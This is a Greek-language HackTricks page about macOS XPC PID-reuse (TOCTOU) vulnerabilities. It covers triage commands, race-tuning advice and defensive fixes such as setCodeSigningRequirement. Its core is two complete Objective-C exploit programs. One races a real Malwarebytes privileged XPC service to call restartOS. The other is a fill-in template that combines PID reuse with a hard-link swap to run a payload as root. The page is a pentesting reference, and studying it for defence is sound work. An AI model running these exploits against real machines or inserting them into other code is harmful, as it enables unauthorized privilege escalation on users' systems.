# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

Όταν μια υπηρεσία **XPC** στο macOS authenticates έναν caller επιλύοντας το **PID** του αντί να χρησιμοποιεί credentials που είναι συνδεδεμένα με το received message, μπορεί να είναι ευάλωτη σε επίθεση PID reuse. Το πρακτικό primitive δεν είναι η αναμονή μέχρι να γίνει wrap το PID namespace: ο attacker στέλνει ένα XPC request και αμέσως καλεί **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** με `POSIX_SPAWN_SETEXEC`, αντικαθιστώντας το process image του attacker με ένα **allowed binary ενώ διατηρεί το PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Αν ο server κάνει dequeue το request και μόνο τότε επιλύει αυτό το numeric PID σε ένα live process για code-signing, entitlement, path ή parent-process checks, βλέπει το replacement binary αντί για το process που έστειλε το message. Το `POSIX_SPAWN_START_SUSPENDED` διατηρεί το trusted replacement ενεργό και σταθερό όσο ο server εκτελεί το check.<sup>[[1]](#references)[[2]](#references)</sup>

### Τι γίνεται πραγματικά race

Η ευάλωτη ακολουθία είναι ένα **message-identity TOCTOU**, όχι απλώς ότι «τα PIDs μπορούν να επαναχρησιμοποιηθούν»:<sup>[[1]](#references)[[2]](#references)</sup>

1. Ένα process του attacker εγκαθιστά ή επαναφέρει μια XPC connection και κάνει queue το privileged request.
2. Πριν η υπηρεσία μετατρέψει το PID της connection σε `SecCodeRef` ή σε άλλο process object, ο attacker κάνει overlay το ίδιο process με ένα approved executable χρησιμοποιώντας `POSIX_SPAWN_SETEXEC`.
3. Η υπηρεσία επικυρώνει το approved image που είναι επί του παρόντος συνδεδεμένο με αυτό το PID και, στη συνέχεια, κάνει dispatch το ήδη queued request που ελέγχεται από τον attacker.

Οποιοδήποτε PID bridge σε authorization data flow είναι ύποπτο: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` ή `audit_token_to_pid`, ακολουθούμενο από `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` ή έναν custom signature verifier. Ένα PID που χρησιμοποιείται μόνο για logging δεν αρκεί· επιβεβαιώστε ότι φτάνει στην allow/deny απόφαση. Ελέγξτε επίσης τα error paths: η προσπάθεια για audit-token lookup πρώτα, αλλά η **επιστροφή στο PID σε περίπτωση αποτυχίας**, επαναφέρει το ίδιο race. Αυτό το fallback pattern εμφανίστηκε σε ανάλυση του 2026 για τα privileged XPC services της Intego.<sup>[[3]](#references)</sup>

### Γρήγορο static και dynamic triage

Ξεκινήστε από τον connection handler και ακολουθήστε κάθε κλήση που παράγει PID μέχρι τα code-signing, entitlement, executable-path ή version checks. Αυτές οι εντολές παρέχουν ένα γρήγορο πρώτο pass σε έναν υποψήφιο helper· ακόμη και τα stripped binaries συνήθως εκθέτουν imported symbols, Objective-C selectors ή diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Κατά τη διάρκεια μιας ελεγχόμενης δοκιμής, κάντε break ή hook τόσο στην πηγή του PID όσο και στον verifier του. Ένα hit στο `xpc_connection_get_pid` ή στο `-processIdentifier` είναι μόνο μια ένδειξη· τα χρήσιμα στοιχεία είναι μια μεταγενέστερη αναζήτηση του **ίδιου ακέραιου αριθμού** μετά τη λήψη του request. Το Frida μπορεί επιπλέον να κάνει hook στον application-specific verifier και στον privileged selector, ώστε να μετρηθεί αν ο selector εκτελείται όταν κερδίζει το PID race.<sup>[[3]](#references)</sup>

### Παράδειγμα exploit

Αν βρείτε τη function **`shouldAcceptNewConnection`** ή μια function που καλείται από αυτήν και **καλεί** το **`processIdentifier`**, χωρίς να καλεί το **`auditToken`**, αυτό πιθανότατα σημαίνει ότι **επαληθεύει το PID της διεργασίας** και όχι το audit token.\
Για παράδειγμα, σε αυτή την εικόνα (από το reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Ελέγξτε αυτό το παράδειγμα exploit (και πάλι, από το reference) για να δείτε τα 2 μέρη του exploit:<sup>[[1]](#references)</sup>

- Ένα που **δημιουργεί πολλά forks**
- **Κάθε fork** θα **στέλνει** το **payload** στην XPC service, ενώ θα εκτελεί το **`posix_spawn`** αμέσως μετά την αποστολή του message.

> [!CAUTION]
> Όταν κάνετε race με `fork()` από μια Objective-C process, εκκινήστε το exploit με εξαγμένο το `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` ή ενσωματώστε το marker `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Πρώτη επιλογή με χρήση των **`NSTasks`** και ορίσματος για την εκκίνηση των children με σκοπό την εκμετάλλευση του RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Αυτό το παράδειγμα χρησιμοποιεί ένα ακατέργαστο **`fork`** για να εκκινήσει **child processes που θα εκμεταλλευτούν τη race condition του PID** και στη συνέχεια θα εκμεταλλευτούν **μια άλλη race condition μέσω ενός Hard link:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Κάνοντας το race αναπαραγώγιμο

Τα παρακάτω σημεία ρύθμισης επανεμφανίζονται σε λειτουργικά PID-reuse exploits και σε πρόσφατες δοκιμές privileged-helper:<sup>[[1]](#references)[[3]](#references)</sup>

- Στείλτε το αίτημα και καλέστε αμέσως το `posix_spawn`· **μην** περιμένετε την απάντηση. Το αίτημα πρέπει να βρίσκεται ήδη στην ουρά όταν ο server πραγματοποιεί το PID lookup μετά την αντικατάσταση του image.
- Διατηρήστε τα `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` μαζί. Το πρώτο flag διατηρεί το PID της racing process· το δεύτερο εμποδίζει το έγκυρο target να τερματιστεί ή να αλλάξει κατάσταση πριν από το validation.
- Χρησιμοποιήστε αρκετούς short-lived racers και επαναλάβετε ολόκληρη τη sequence σύνδεσης/request/exec. Ο βέλτιστος αριθμός εξαρτάται από το target· υπερβολικά πολλά children μπορούν να επιβραδύνουν το service και να επιδεινώσουν το παράθυρο.
- Η αντικατάσταση πρέπει να ικανοποιεί ολόκληρη την απαίτηση του server. Επαναχρησιμοποιήστε το legitimate client binary όταν είναι δυνατό και ελέγξτε πρώτα την designated requirement του με `codesign -d -r- "/path/to/client.app"`.
- Καλέστε πρώτα έναν harmless exported selector ή μια read-only method. Αυτό διαχωρίζει την επιτυχή authentication από την επιτυχή εκμετάλλευση ενός μεταγενέστερου privileged primitive.

## Αποφυγή του PID bridge

Στο macOS 13 και νεότερα, το Foundation εκθέτει το `-[NSXPCConnection setCodeSigningRequirement:]`. Ορίστε την απαίτηση του peer ακριβώς μία φορά και **πριν** από το `resume`· malformed requirement strings προκαλούν exception (ή fatal error στη Swift), ενώ ένα μήνυμα από peer που δεν ικανοποιεί την απαίτηση invalidates τη σύνδεση. Έτσι, το XPC μπορεί να επιβάλει την code identity του peer χωρίς ο application code να κάνει resolving ενός PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Για το σύγχρονο low-level listener API στο macOS 26+, το `xpc_listener_set_peer_requirement` εφαρμόζει ένα επικυρωμένο `xpc_peer_requirement_t` όσο ο listener είναι ανενεργός. Το XPC απορρίπτει requests που δεν πληρούν την απαίτηση· τα peer sessions που δημιουργούνται από τον listener **δεν** την κληρονομούν, επομένως εφαρμόστε και μια κατάλληλη session requirement όταν αυτά τα sessions εξουσιοδοτούν privileged operations.<sup>[[7]](#references)</sup>

> [!WARNING]
> Μην το «διορθώσετε» αντιγράφοντας ένα audit token και μετατρέποντάς το έπειτα ξανά σε PID για το πραγματικό `SecCode` lookup. Διατηρήστε την ταυτότητα που προκύπτει από το audit token καθ' όλη τη διαδικασία authorization ή χρησιμοποιήστε ένα XPC peer-requirement API από άκρο σε άκρο.<sup>[[2]](#references)[[6]](#references)</sup> Τα connection-wide audit-token APIs έχουν επίσης ξεχωριστή κατηγορία race condition, η οποία καλύπτεται στο [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Άλλα παραδείγματα

- [**Intego X9: Γιατί το macOS antivirus σας δεν πρέπει να εμπιστεύεται τα PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE εναντίον ενός privileged helper antivirus που έκανε authenticate τους clients μέσω PID.<sup>[[3]](#references)</sup>
- [**Εκμετάλλευση της υπηρεσίας GOG Galaxy XPC για privilege escalation στο macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Μέρος II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Μάθετε XPC exploitation - Μέρος 2: Πείτε όχι στο PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Μην εμπιστεύεστε το PID! Ιστορίες ενός απλού logic bug και πού να το βρείτε - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Γιατί το macOS antivirus σας δεν πρέπει να εμπιστεύεται τα PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Εκμετάλλευση της υπηρεσίας GOG Galaxy XPC για privilege escalation στο macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Μέρος II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
